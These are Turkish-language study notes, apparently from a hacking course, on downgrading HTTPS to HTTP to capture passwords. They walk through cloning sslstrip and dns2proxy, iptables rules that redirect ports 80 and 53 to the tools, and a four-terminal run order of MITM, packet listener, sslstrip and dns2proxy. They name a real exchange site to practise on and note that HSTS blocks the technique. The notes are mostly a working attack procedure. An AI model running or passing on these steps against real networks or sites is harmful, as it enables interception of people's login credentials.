HTTPS: Secure HTTP

Okumaya çalıştığımız paketler şifreli bir şekilde gider. 
Paketleri ele geçirsen de okuyamazsın.

SSLstrip+ aracı: HTTPS olarak girilen siteleri HTTP olarak açmak için kullanılır.
           opt içindesin:    #mkdir sslstrip
                             #cd sslstrip
                             #git clone https://github.com/moxie0/sslstrip
                             #cd sslstrip
                             Burada sslstrip.py isimli bir python dosyası bulursun.

dns2proxy: İndirmek gerekir.
           Terminalde opt'un içine girersin:    #mkdir dnstest
                                                #cd dnstest
           (github'ta olan projeyi kopyalar) -> #git clone https://github.com/singe/dns2proxy
                                                #cd dns2proxy
                                                Burada dns2proxy.py isimli bir python dosyası bulursun.


dns ve sslstrip'i çalıştırmadan önce bir işlem yapmamız lazım.
İşlem: IP tableları değiştireceğiz. Bazı yönlendirmeler yapacağız. "Bize 80 portundan gelen verileri yani HTTP'den gelen verileri al ve istediğimiz portlara yönlendir." diyeceğiz. Çünkü çalıştıracağımız sslstrip bir proxy ve bilgisayarımıza gelen verileri işlemesi için ona da yollamamız gerekiyor. Bunun için de iptables komutunu kullanacağız:

#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 ----> nat tablolarını değiştirmek istiyoruz
 ----> sslstrip 10000 portunda çalışır
 ----> 80 portundan gelen verileri al, 10000 portuna yolla dedik

#iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
 ----> dns2proxy için
 ----> yapmasak da muhtemelen çalışır ama garanti olsun



4 TERMİNAL (ÇALIŞTIRMA SIRASINA GÖRE) ----> 1) MITM
                                            2) PACKET LISTENER
                                            3) SSLSTRIP ---> github'tan bulduğumuz python dosyası
                                            4) DNS2PROXY ---> github'tan bulduğumuz python dosyası


Windows'ta http ve https sitelerinde denemeler yapıp dinleyicinde verileri görebilirsin.
https için deneme sitesi: bitfinex.com

Böylece https kullanan bir siteye http'ye downgrade edip şifreyi almayı başardık.

Her zaman çalışmaz. 
sslstrip ve dns2proxy kendini geliştiriyor, siteler buna karşı önlemler alıyor.


Facebook ve Gmail HSTS kullanır. Hiçbir şart altında HTTPS dışında bir şey açılma.
HSTS kullanmanın avantajları ve dezavantajları var.



pcapy bulunmuyor hatası alırsan: apt-get install libpcap-dev
                                 pip install pcapy

*Sorun pcap header dosyasını bulamamasından kaynaklanıyor.